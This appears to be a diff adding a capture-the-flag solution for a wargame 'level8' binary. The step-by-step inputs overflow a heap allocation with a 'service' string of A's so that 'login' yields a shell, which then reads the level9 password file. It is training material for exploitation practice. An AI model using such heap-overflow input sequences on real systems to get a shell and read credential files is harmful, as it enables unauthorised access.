@@ -1,0 +1,14 @@
+# We have to write non-zero value at 'a[32]' and input 'login' to get a reverse shell
+./level8
+
+# We allocate 'a'
+$ auth toto
+
+# We allocate and fill 'b' with non-zero values
+$ serviceAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+# We get our reverse shell
+$ login
+
+# We use the reverse shell to retrieve the password
+$$ cat /home/user/level9/.pass
